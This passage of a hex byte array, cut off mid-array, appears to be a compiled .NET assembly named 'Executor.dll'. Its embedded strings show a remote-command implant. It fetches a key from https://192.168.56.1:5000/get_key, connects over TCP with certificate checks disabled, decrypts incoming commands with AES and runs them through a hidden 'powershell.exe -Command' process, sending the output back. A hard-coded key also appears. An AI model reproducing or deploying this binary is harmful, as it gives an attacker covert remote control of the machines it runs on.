0x00,0xb4,0x00,0x00,0x00,0x23,0x55,0x53,0x00,0xec,0x0c,0x00,0x00,0x10,0x00,0x00,0x00,0x23,0x47,0x55,0x49,0x44,0x00,0x00,0x00,0xfc,0x0c,0x00,0x00,0x48,0x02,0x00,0x00,0x23,0x42,0x6c,0x6f,0x62,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x01,0x57,0x15,0x02,0x00,0x09,0x0a,0x00,0x00,0x00,0xfa,0x01,0x33,0x00,0x16,0x00,0x00,0x01,0x00,0x00,0x00,0x2e,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x09,0x00,0x00,0x00,0x3d,0x00,0x00,0x00,0x12,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x09,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x54,0x03,0x01,0x00,0x00,0x00,0x00,0x00,0x06,0x00,0x31,0x02,0xdf,0x04,0x06,0x00,0x9c,0x02,0xdf,0x04,0x06,0x00,0x61,0x01,0xc8,0x04,0x0f,0x00,0xff,0x04,0x00,0x00,0x06,0x00,0x9e,0x01,0xdc,0x02,0x06,0x00,0x83,0x02,0xc8,0x03,0x06,0x00,0xfa,0x01,0xc8,0x03,0x06,0x00,0xb7,0x01,0xc8,0x03,0x06,0x00,0xd4,0x01,0xc8,0x03,0x06,0x00,0x51,0x02,0xc8,0x03,0x06,0x00,0x87,0x01,0xc8,0x03,0x06,0x00,0x19,0x02,0xdf,0x04,0x06,0x00,0x6a,0x02,0xdf,0x04,0x06,0x00,0x75,0x01,0xdf,0x04,0x06,0x00,0xae,0x05,0x93,0x03,0x0a,0x00,0xad,0x03,0x93,0x06,0x06,0x00,0x86,0x03,0x4e,0x00,0x0a,0x00,0x6f,0x03,0x93,0x06,0x06,0x00,0x3f,0x04,0x4e,0x00,0x06,0x00,0x13,0x04,0x4e,0x00,0x0a,0x00,0xdb,0x04,0x93,0x06,0x0e,0x00,0xe1,0x05,0x86,0x05,0x0e,0x00,0x61,0x03,0x86,0x05,0x06,0x00,0xda,0x03,0x93,0x03,0x12,0x00,0x7e,0x05,0xc8,0x04,0x06,0x00,0x46,0x01,0xdf,0x04,0x16,0x00,0x08,0x03,0xb0,0x06,0x0a,0x00,0x29,0x01,0x0e,0x05,0x0a,0x00,0xbe,0x03,0x0e,0x05,0x1a,0x00,0x5b,0x05,0xb0,0x06,0x06,0x00,0x8c,0x03,0x4e,0x00,0x0a,0x00,0xc1,0x00,0x93,0x06,0x06,0x00,0x4c,0x04,0x4e,0x00,0x06,0x00,0xf9,0x00,0x93,0x03,0x06,0x00,0x20,0x04,0x4e,0x00,0x1e,0x00,0x2b,0x04,0xb5,0x05,0x22,0x00,0xd7,0x05,0xb5,0x05,0x0a,0x00,0x9a,0x03,0x93,0x06,0x06,0x00,0xd3,0x02,0x47,0x06,0x0a,0x00,0xd2,0x00,0x93,0x06,0x06,0x00,0xce,0x02,0x93,0x03,0x26,0x00,0xee,0x00,0x07,0x04,0x06,0x00,0x16,0x00,0x77,0x00,0x06,0x00,0x57,0x04,0x93,0x03,0x06,0x00,0xf6,0x02,0x93,0x03,0x12,0x00,0xf6,0x03,0xc8,0x04,0x00,0x00,0x00,0x00,0x45,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x10,0x00,0xbf,0x04,0x00,0x00,0x3d,0x00,0x01,0x00,0x01,0x00,0x03,0x21,0x10,0x00,0x73,0x00,0x00,0x00,0x3d,0x00,0x01,0x00,0x06,0x00,0x36,0x00,0x2d,0x00,0x30,0x01,0x16,0x00,0x01,0x00,0x34,0x01,0x50,0x20,0x00,0x00,0x00,0x00,0x91,0x00,0x0b,0x06,0x38,0x01,0x01,0x00,0xbc,0x20,0x00,0x00,0x00,0x00,0x91,0x00,0x03,0x06,0x40,0x01,0x03,0x00,0x20,0x21,0x00,0x00,0x00,0x00,0x96,0x00,0xe4,0x03,0x48,0x01,0x05,0x00,0xf8,0x22,0x00,0x00,0x00,0x00,0x91,0x00,0xa1,0x00,0x4c,0x01,0x05,0x00,0x75,0x23,0x00,0x00,0x00,0x00,0x86,0x18,0x7e,0x04,0x06,0x00,0x06,0x00,0x7e,0x23,0x00,0x00,0x00,0x00,0x91,0x18,0x84,0x04,0x48,0x01,0x06,0x00,0x8a,0x23,0x00,0x00,0x00,0x00,0x86,0x18,0x7e,0x04,0x06,0x00,0x06,0x00,0x94,0x23,0x00,0x00,0x00,0x00,0x83,0x00,0x0a,0x00,0x51,0x01,0x06,0x00,0x00,0x00,0x01,0x00,0x53,0x06,0x00,0x00,0x02,0x00,0xb5,0x04,0x00,0x00,0x01,0x00,0x5d,0x06,0x00,0x00,0x02,0x00,0x9b,0x04,0x00,0x00,0x01,0x00,0xb0,0x00,0x00,0x00,0x01,0x00,0x31,0x00,0x00,0x00,0x02,0x00,0x36,0x00,0x00,0x00,0x03,0x00,0x3b,0x00,0x00,0x00,0x04,0x00,0x40,0x00,0x09,0x00,0x7e,0x04,0x01,0x00,0x11,0x00,0x7e,0x04,0x06,0x00,0x19,0x00,0x7e,0x04,0x0a,0x00,0x29,0x00,0x7e,0x04,0x10,0x00,0x31,0x00,0x7e,0x04,0x10,0x00,0x39,0x00,0x7e,0x04,0x10,0x00,0x41,0x00,0x7e,0x04,0x10,0x00,0x49,0x00,0x7e,0x04,0x10,0x00,0x51,0x00,0x7e,0x04,0x10,0x00,0x59,0x00,0x7e,0x04,0x10,0x00,0x61,0x00,0x7e,0x04,0x01,0x00,0x69,0x00,0x7e,0x04,0x15,0x00,0x71,0x00,0x7e,0x04,0x15,0x00,0xd1,0x00,0x7e,0x04,0x06,0x00,0x89,0x00,0x7e,0x04,0x06,0x00,0x91,0x00,0x7e,0x04,0x25,0x00,0x99,0x00,0x7e,0x04,0x30,0x00,0x09,0x01,0x40,0x01,0x10,0x00,0x11,0x01,0x21,0x01,0x06,0x00,0x89,0x00,0x7b,0x06,0x36,0x00,0x89,0x00,0x7e,0x04,0x45,0x00,0xa1,0x00,0x7e,0x04,0x30,0x00,0x19,0x01,0x97,0x00,0x4b,0x00,0xa9,0x00,0x39,0x01,0x68,0x00,0xd9,0x00,0x7e,0x04,0x6d,0x00,0x21,0x01,0x2c,0x03,0x73,0x00,0x29,0x01,0x7e,0x04,0x06,0x00,0x29,0x01,0x66,0x00,0x79,0x00,0x31,0x01,0x8b,0x06,0x45,0x00,0x39,0x01,0x24,0x00,0x7f,0x00,0x39,0x01,0x3c,0x05,0x79,0x00,0x31,0x01,0x5f,0x00,0x45,0x00,0x31,0x01,0xb8,0x00,0x85,0x00,0x31,0x01,0x83,0x06,0x36,0x00,0x31,0x01,0x58,0x00,0x36,0x00,0x31,0x01,0xa5,0x04,0x8c,0x00,0x31,0x01,0x8b,0x04,0x8c,0x00,0xb1,0x00,0x7e,0x04,0x95,0x00,0xb1,0x00,0x7c,0x03,0x9b,0x00,0xf9,0x00,0x92,0x00,0xa0,0x00,0x51,0x01,0xe9,0x00,0xa8,0x00,0x51,0x01,0x7b,0x06,0xbf,0x00,0x61,0x01,0x3c,0x05,0xcd,0x00,0x51,0x01,0xa7,0x05,0xd3,0x00,0xf9,0x00,0x40,0x01,0xec,0x00,0xc1,0x00,0xdd,0x00,0x4b,0x00,0x69,0x01,0xfd,0x02,0xf4,0x00,0xc9,0x00,0x7e,0x04,0x06,0x00,0x71,0x01,0x7e,0x04,0x06,0x00,0x71,0x01,0x05,0x01,0x10,0x00,0x69,0x01,0xa7,0x05,0xff,0x00,0x71,0x01,0x99,0x05,0x10,0x00,0x71,0x01,0x2c,0x06,0x05,0x01,0x71,0x01,0xba,0x02,0x05,0x01,0x71,0x01,0x68,0x06,0x05,0x01,0x71,0x01,0x64,0x04,0x05,0x01,0xc9,0x00,0xe8,0x03,0x0a,0x01,0xc9,0x00,0x13,0x06,0x11,0x01,0xc9,0x00,0x19,0x06,0x15,0x01,0xc9,0x00,0xc0,0x05,0x06,0x00,0x79,0x00,0x7e,0x04,0x06,0x00,0x21,0x00,0x6b,0x00,0x2b,0x02,0x27,0x00,0x5b,0x00,0x3c,0x02,0x2e,0x00,0x0b,0x00,0x5c,0x01,0x2e,0x00,0x13,0x00,0x65,0x01,0x2e,0x00,0x1b,0x00,0x84,0x01,0x2e,0x00,0x23,0x00,0x8d,0x01,0x2e,0x00,0x2b,0x00,0xcb,0x01,0x2e,0x00,0x33,0x00,0xd9,0x01,0x2e,0x00,0x3b,0x00,0xe4,0x01,0x2e,0x00,0x43,0x00,0xf1,0x01,0x2e,0x00,0x4b,0x00,0xcb,0x01,0x2e,0x00,0x53,0x00,0xcb,0x01,0x41,0x00,0x6b,0x00,0x2b,0x02,0x43,0x00,0x63,0x00,0x31,0x02,0x43,0x00,0x6b,0x00,0x2b,0x02,0x63,0x00,0x73,0x00,0x37,0x02,0xc4,0x00,0x6b,0x00,0x31,0x02,0x00,0x01,0x63,0x00,0x25,0x02,0x1a,0x00,0x3b,0x00,0x4f,0x00,0xf8,0x00,0x1a,0x01,0x04,0x80,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xbf,0x04,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1e,0x01,0x12,0x01,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1e,0x01,0x93,0x06,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1e,0x01,0x86,0x05,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1e,0x01,0x6b,0x05,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1e,0x01,0xb0,0x06,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1e,0x01,0x45,0x05,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x27,0x01,0xeb,0x05,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x27,0x01,0xcc,0x05,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1e,0x01,0x07,0x04,0x00,0x00,0x00,0x00,0x03,0x00,0x02,0x00,0x53,0x00,0xbb,0x00,0x55,0x00,0xbb,0x00,0x59,0x00,0xbb,0x00,0x00,0x00,0x00,0x00,0x00,0x3c,0x3e,0x39,0x5f,0x5f,0x32,0x5f,0x30,0x00,0x3c,0x52,0x75,0x6e,0x3e,0x62,0x5f,0x5f,0x32,0x5f,0x30,0x00,0x49,0x45,0x6e,0x75,0x6d,0x65,0x72,0x61,0x62,0x6c,0x65,0x60,0x31,0x00,0x67,0x65,0x74,0x5f,0x55,0x54,0x46,0x38,0x00,0x3c,0x3e,0x39,0x00,0x3c,0x70,0x30,0x3e,0x00,0x3c,0x70,0x31,0x3e,0x00,0x3c,0x70,0x32,0x3e,0x00,0x3c,0x70,0x33,0x3e,0x00,0x3c,0x4d,0x6f,0x64,0x75,0x6c,0x65,0x3e,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x49,0x4f,0x00,0x67,0x65,0x74,0x5f,0x49,0x56,0x00,0x73,0x65,0x74,0x5f,0x49,0x56,0x00,0x44,0x6f,0x77,0x6e,0x6c,0x6f,0x61,0x64,0x44,0x61,0x74,0x61,0x00,0x3c,0x3e,0x63,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x43,0x6f,0x6c,0x6c,0x65,0x63,0x74,0x69,0x6f,0x6e,0x73,0x2e,0x47,0x65,0x6e,0x65,0x72,0x69,0x63,0x00,0x52,0x65,0x61,0x64,0x00,0x52,0x65,0x61,0x64,0x54,0x6f,0x45,0x6e,0x64,0x00,0x45,0x78,0x65,0x63,0x75,0x74,0x65,0x43,0x6f,0x6d,0x6d,0x61,0x6e,0x64,0x00,0x63,0x6f,0x6d,0x6d,0x61,0x6e,0x64,0x00,0x73,0x65,0x74,0x5f,0x4d,0x6f,0x64,0x65,0x00,0x43,0x72,0x79,0x70,0x74,0x6f,0x53,0x74,0x72,0x65,0x61,0x6d,0x4d,0x6f,0x64,0x65,0x00,0x43,0x69,0x70,0x68,0x65,0x72,0x4d,0x6f,0x64,0x65,0x00,0x67,0x65,0x74,0x5f,0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x00,0x54,0x61,0x6b,0x65,0x00,0x45,0x6e,0x75,0x6d,0x65,0x72,0x61,0x62,0x6c,0x65,0x00,0x49,0x44,0x69,0x73,0x70,0x6f,0x73,0x61,0x62,0x6c,0x65,0x00,0x73,0x65,0x74,0x5f,0x46,0x69,0x6c,0x65,0x4e,0x61,0x6d,0x65,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x75,0x6e,0x74,0x69,0x6d,0x65,0x00,0x44,0x69,0x73,0x70,0x6f,0x73,0x65,0x00,0x58,0x35,0x30,0x39,0x43,0x65,0x72,0x74,0x69,0x66,0x69,0x63,0x61,0x74,0x65,0x00,0x43,0x72,0x65,0x61,0x74,0x65,0x00,0x57,0x72,0x69,0x74,0x65,0x00,0x43,0x6f,0x6d,0x70,0x69,0x6c,0x65,0x72,0x47,0x65,0x6e,0x65,0x72,0x61,0x74,0x65,0x64,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x44,0x65,0x62,0x75,0x67,0x67,0x61,0x62,0x6c,0x65,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x4e,0x75,0x6c,0x6c,0x61,0x62,0x6c,0x65,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x54,0x69,0x74,0x6c,0x65,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x54,0x61,0x72,0x67,0x65,0x74,0x46,0x72,0x61,0x6d,0x65,0x77,0x6f,0x72,0x6b,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x46,0x69,0x6c,0x65,0x56,0x65,0x72,0x73,0x69,0x6f,0x6e,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x49,0x6e,0x66,0x6f,0x72,0x6d,0x61,0x74,0x69,0x6f,0x6e,0x61,0x6c,0x56,0x65,0x72,0x73,0x69,0x6f,0x6e,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x43,0x6f,0x6e,0x66,0x69,0x67,0x75,0x72,0x61,0x74,0x69,0x6f,0x6e,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x52,0x65,0x66,0x53,0x61,0x66,0x65,0x74,0x79,0x52,0x75,0x6c,0x65,0x73,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x43,0x6f,0x6d,0x70,0x69,0x6c,0x61,0x74,0x69,0x6f,0x6e,0x52,0x65,0x6c,0x61,0x78,0x61,0x74,0x69,0x6f,0x6e,0x73,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x50,0x72,0x6f,0x64,0x75,0x63,0x74,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x4e,0x75,0x6c,0x6c,0x61,0x62,0x6c,0x65,0x43,0x6f,0x6e,0x74,0x65,0x78,0x74,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79,0x43,0x6f,0x6d,0x70,0x61,0x6e,0x79,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x52,0x75,0x6e,0x74,0x69,0x6d,0x65,0x43,0x6f,0x6d,0x70,0x61,0x74,0x69,0x62,0x69,0x6c,0x69,0x74,0x79,0x41,0x74,0x74,0x72,0x69,0x62,0x75,0x74,0x65,0x00,0x73,0x65,0x74,0x5f,0x55,0x73,0x65,0x53,0x68,0x65,0x6c,0x6c,0x45,0x78,0x65,0x63,0x75,0x74,0x65,0x00,0x42,0x79,0x74,0x65,0x00,0x45,0x6e,0x63,0x6f,0x64,0x69,0x6e,0x67,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x75,0x6e,0x74,0x69,0x6d,0x65,0x2e,0x56,0x65,0x72,0x73,0x69,0x6f,0x6e,0x69,0x6e,0x67,0x00,0x53,0x74,0x72,0x69,0x6e,0x67,0x00,0x67,0x65,0x74,0x5f,0x4c,0x65,0x6e,0x67,0x74,0x68,0x00,0x52,0x65,0x6d,0x6f,0x74,0x65,0x43,0x65,0x72,0x74,0x69,0x66,0x69,0x63,0x61,0x74,0x65,0x56,0x61,0x6c,0x69,0x64,0x61,0x74,0x69,0x6f,0x6e,0x43,0x61,0x6c,0x6c,0x62,0x61,0x63,0x6b,0x00,0x73,0x65,0x74,0x5f,0x53,0x65,0x72,0x76,0x65,0x72,0x43,0x65,0x72,0x74,0x69,0x66,0x69,0x63,0x61,0x74,0x65,0x56,0x61,0x6c,0x69,0x64,0x61,0x74,0x69,0x6f,0x6e,0x43,0x61,0x6c,0x6c,0x62,0x61,0x63,0x6b,0x00,0x45,0x78,0x65,0x63,0x75,0x74,0x6f,0x72,0x2e,0x64,0x6c,0x6c,0x00,0x4e,0x65,0x74,0x77,0x6f,0x72,0x6b,0x53,0x74,0x72,0x65,0x61,0x6d,0x00,0x43,0x72,0x79,0x70,0x74,0x6f,0x53,0x74,0x72,0x65,0x61,0x6d,0x00,0x47,0x65,0x74,0x53,0x74,0x72,0x65,0x61,0x6d,0x00,0x4d,0x65,0x6d,0x6f,0x72,0x79,0x53,0x74,0x72,0x65,0x61,0x6d,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x00,0x53,0x79,0x6d,0x6d,0x65,0x74,0x72,0x69,0x63,0x41,0x6c,0x67,0x6f,0x72,0x69,0x74,0x68,0x6d,0x00,0x49,0x43,0x72,0x79,0x70,0x74,0x6f,0x54,0x72,0x61,0x6e,0x73,0x66,0x6f,0x72,0x6d,0x00,0x58,0x35,0x30,0x39,0x43,0x68,0x61,0x69,0x6e,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x65,0x66,0x6c,0x65,0x63,0x74,0x69,0x6f,0x6e,0x00,0x45,0x78,0x63,0x65,0x70,0x74,0x69,0x6f,0x6e,0x00,0x52,0x75,0x6e,0x00,0x73,0x65,0x74,0x5f,0x53,0x74,0x61,0x72,0x74,0x49,0x6e,0x66,0x6f,0x00,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x53,0x74,0x61,0x72,0x74,0x49,0x6e,0x66,0x6f,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x4c,0x69,0x6e,0x71,0x00,0x53,0x74,0x72,0x65,0x61,0x6d,0x52,0x65,0x61,0x64,0x65,0x72,0x00,0x54,0x65,0x78,0x74,0x52,0x65,0x61,0x64,0x65,0x72,0x00,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x50,0x6f,0x69,0x6e,0x74,0x4d,0x61,0x6e,0x61,0x67,0x65,0x72,0x00,0x53,0x74,0x72,0x65,0x61,0x6d,0x57,0x72,0x69,0x74,0x65,0x72,0x00,0x54,0x65,0x78,0x74,0x57,0x72,0x69,0x74,0x65,0x72,0x00,0x42,0x69,0x74,0x43,0x6f,0x6e,0x76,0x65,0x72,0x74,0x65,0x72,0x00,0x73,0x65,0x74,0x5f,0x52,0x65,0x64,0x69,0x72,0x65,0x63,0x74,0x53,0x74,0x61,0x6e,0x64,0x61,0x72,0x64,0x45,0x72,0x72,0x6f,0x72,0x00,0x2e,0x63,0x74,0x6f,0x72,0x00,0x2e,0x63,0x63,0x74,0x6f,0x72,0x00,0x43,0x72,0x65,0x61,0x74,0x65,0x44,0x65,0x63,0x72,0x79,0x70,0x74,0x6f,0x72,0x00,0x64,0x65,0x63,0x72,0x79,0x70,0x74,0x6f,0x72,0x00,0x43,0x72,0x65,0x61,0x74,0x65,0x45,0x6e,0x63,0x72,0x79,0x70,0x74,0x6f,0x72,0x00,0x65,0x6e,0x63,0x72,0x79,0x70,0x74,0x6f,0x72,0x00,0x45,0x78,0x65,0x63,0x75,0x74,0x6f,0x72,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x44,0x69,0x61,0x67,0x6e,0x6f,0x73,0x74,0x69,0x63,0x73,0x00,0x41,0x65,0x73,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x75,0x6e,0x74,0x69,0x6d,0x65,0x2e,0x43,0x6f,0x6d,0x70,0x69,0x6c,0x65,0x72,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x73,0x00,0x44,0x65,0x62,0x75,0x67,0x67,0x69,0x6e,0x67,0x4d,0x6f,0x64,0x65,0x73,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x53,0x65,0x63,0x75,0x72,0x69,0x74,0x79,0x2e,0x43,0x72,0x79,0x70,0x74,0x6f,0x67,0x72,0x61,0x70,0x68,0x79,0x2e,0x58,0x35,0x30,0x39,0x43,0x65,0x72,0x74,0x69,0x66,0x69,0x63,0x61,0x74,0x65,0x73,0x00,0x47,0x65,0x74,0x42,0x79,0x74,0x65,0x73,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x4e,0x65,0x74,0x2e,0x50,0x72,0x69,0x6d,0x69,0x74,0x69,0x76,0x65,0x73,0x00,0x53,0x73,0x6c,0x50,0x6f,0x6c,0x69,0x63,0x79,0x45,0x72,0x72,0x6f,0x72,0x73,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x44,0x69,0x61,0x67,0x6e,0x6f,0x73,0x74,0x69,0x63,0x73,0x2e,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x4e,0x65,0x74,0x2e,0x53,0x6f,0x63,0x6b,0x65,0x74,0x73,0x00,0x73,0x65,0x74,0x5f,0x41,0x72,0x67,0x75,0x6d,0x65,0x6e,0x74,0x73,0x00,0x43,0x6f,0x6e,0x63,0x61,0x74,0x00,0x4f,0x62,0x6a,0x65,0x63,0x74,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x4e,0x65,0x74,0x00,0x57,0x61,0x69,0x74,0x46,0x6f,0x72,0x45,0x78,0x69,0x74,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x4e,0x65,0x74,0x2e,0x57,0x65,0x62,0x43,0x6c,0x69,0x65,0x6e,0x74,0x00,0x54,0x63,0x70,0x43,0x6c,0x69,0x65,0x6e,0x74,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x4e,0x65,0x74,0x2e,0x53,0x65,0x72,0x76,0x69,0x63,0x65,0x50,0x6f,0x69,0x6e,0x74,0x00,0x44,0x65,0x63,0x72,0x79,0x70,0x74,0x00,0x45,0x6e,0x63,0x72,0x79,0x70,0x74,0x00,0x53,0x74,0x61,0x72,0x74,0x00,0x67,0x65,0x74,0x5f,0x53,0x74,0x61,0x6e,0x64,0x61,0x72,0x64,0x4f,0x75,0x74,0x70,0x75,0x74,0x00,0x73,0x65,0x74,0x5f,0x52,0x65,0x64,0x69,0x72,0x65,0x63,0x74,0x53,0x74,0x61,0x6e,0x64,0x61,0x72,0x64,0x4f,0x75,0x74,0x70,0x75,0x74,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x54,0x65,0x78,0x74,0x00,0x70,0x6c,0x61,0x69,0x6e,0x74,0x65,0x78,0x74,0x00,0x63,0x69,0x70,0x68,0x65,0x72,0x74,0x65,0x78,0x74,0x00,0x73,0x65,0x74,0x5f,0x43,0x72,0x65,0x61,0x74,0x65,0x4e,0x6f,0x57,0x69,0x6e,0x64,0x6f,0x77,0x00,0x54,0x6f,0x41,0x72,0x72,0x61,0x79,0x00,0x67,0x65,0x74,0x5f,0x4b,0x65,0x79,0x00,0x73,0x65,0x74,0x5f,0x4b,0x65,0x79,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x53,0x65,0x63,0x75,0x72,0x69,0x74,0x79,0x2e,0x43,0x72,0x79,0x70,0x74,0x6f,0x67,0x72,0x61,0x70,0x68,0x79,0x00,0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x4e,0x65,0x74,0x2e,0x53,0x65,0x63,0x75,0x72,0x69,0x74,0x79,0x00,0x00,0x43,0x68,0x00,0x74,0x00,0x74,0x00,0x70,0x00,0x73,0x00,0x3a,0x00,0x2f,0x00,0x2f,0x00,0x31,0x00,0x39,0x00,0x32,0x00,0x2e,0x00,0x31,0x00,0x36,0x00,0x38,0x00,0x2e,0x00,0x35,0x00,0x36,0x00,0x2e,0x00,0x31,0x00,0x3a,0x00,0x35,0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x2f,0x00,0x67,0x00,0x65,0x00,0x74,0x00,0x5f,0x00,0x6b,0x00,0x65,0x00,0x79,0x00,0x00,0x21,0x5a,0x00,0x36,0x00,0x4c,0x00,0x68,0x00,0x46,0x00,0x44,0x00,0x69,0x00,0x43,0x00,0x67,0x00,0x66,0x00,0x4f,0x00,0x42,0x00,0x38,0x00,0x48,0x00,0x4e,0x00,0x4b,0x00,0x00,0x19,0x31,0x00,0x39,0x00,0x32,0x00,0x2e,0x00,0x31,0x00,0x36,0x00,0x38,0x00,0x2e,0x00,0x35,0x00,0x36,0x00,0x2e,0x00,0x31,0x00,0x00,0x1d,0x70,0x00,0x6f,0x00,0x77,0x00,0x65,0x00,0x72,0x00,0x73,0x00,0x68,0x00,0x65,0x00,0x6c,0x00,0x6c,0x00,0x2e,0x00,0x65,0x00,0x78,0x00,0x65,0x00,0x00,0x13,0x2d,0x00,0x43,0x00,0x6f,0x00,0x6d,0x00,0x6d,0x00,0x61,0x00,0x6e,0x00,0x64,0x00,0x20,0x00,0x01,0x00,0xf7,0x24,0x5a,0x59,0xd3,0xb7,0x67,0x47,0xa2,0x92,0x2f,0xe7,0x06,0xc9,0xca,0x84,0x00,0x04,0x20,0x01,0x01,0x08,0x03,0x20,0x00,0x01,0x05,0x20,0x01,0x01,0x11,0x11,0x04,0x20,0x01,0x01,0x0e,0x04,0x20,0x01,0x01,0x05,0x0a,0x07,0x04,0x12,0x45,0x12,0x49,0x12,0x4d,0x1d,0x05,0x0a,0x20,0x03,0x01,0x12,0x7d,0x12,0x41,0x11,0x80,0x81,0x05,0x20,0x01,0x01,0x12,0x7d,0x04,0x20,0x00,0x1d,0x05,0x09,0x07,0x04,0x12,0x45,0x12,0x49,0x12,0x51,0x0e,0x05,0x20,0x01,0x01,0x1d,0x05,0x03,0x20,0x00,0x0e,0x18,0x07,0x0d,0x12,0x55,0x12,0x41,0x12,0x41,0x12,0x59,0x12,0x5d,0x1d,0x05,0x08,0x0e,0x0e,0x1d,0x05,0x1d,0x05,0x02,0x12,0x61,0x04,0x00,0x00,0x12,0x55,0x05,0x20,0x02,0x01,0x1c,0x18,0x05,0x00,0x01,0x01,0x12,0x6d,0x05,0x20,0x01,0x1d,0x05,0x0e,0x05,0x00,0x00,0x12,0x80,0x9d,0x06,0x20,0x01,0x01,0x11,0x80,0xa1,0x08,0x20,0x02,0x12,0x41,0x1d,0x05,0x1d,0x05,0x05,0x20,0x02,0x01,0x0e,0x08,0x04,0x20,0x00,0x12,0x5d,0x07,0x20,0x03,0x08,0x1d,0x05,0x08,0x08,0x12,0x10,0x01,0x02,0x15,0x12,0x80,0xad,0x01,0x1e,0x00,0x15,0x12,0x80,0xad,0x01,0x1e,0x00,0x08,0x03,0x0a,0x01,0x05,0x0d,0x10,0x01,0x01,0x1d,0x1e,0x00,0x15,0x12,0x80,0xad,0x01,0x1e,0x00,0x05,0x00,0x01,0x1d,0x05,0x08,0x18,0x10,0x01,0x02,0x15,0x12,0x80,0xad,0x01,0x1e,0x00,0x15,0x12,0x80,0xad,0x01,0x1e,0x00,0x15,0x12,0x80,0xad,0x01,0x1e,0x00,0x07,0x20,0x03,0x01,0x1d,0x05,0x08,0x08,0x03,0x20,0x00,0x08,0x06,0x07,0x03,0x12,0x65,0x0e,0x0e,0x05,0x00,0x02,0x0e,0x0e,0x0e,0x04,0x20,0x01,0x01,0x02,0x06,0x20,0x01,0x01,0x12,0x80,0xb9,0x03,0x20,0x00,0x02,0x04,0x20,0x00,0x12,0x51,0x03,0x07,0x01,0x02,0x08,0xb0,0x3f,0x5f,0x7f,0x11,0xd5,0x0a,0x3a,0x08,0xcc,0x7b,0x13,0xff,0xcd,0x2d,0xdd,0x51,0x03,0x06,0x12,0x0c,0x03,0x06,0x12,0x6d,0x07,0x00,0x02,0x1d,0x05,0x0e,0x12,0x41,0x07,0x00,0x02,0x0e,0x1d,0x05,0x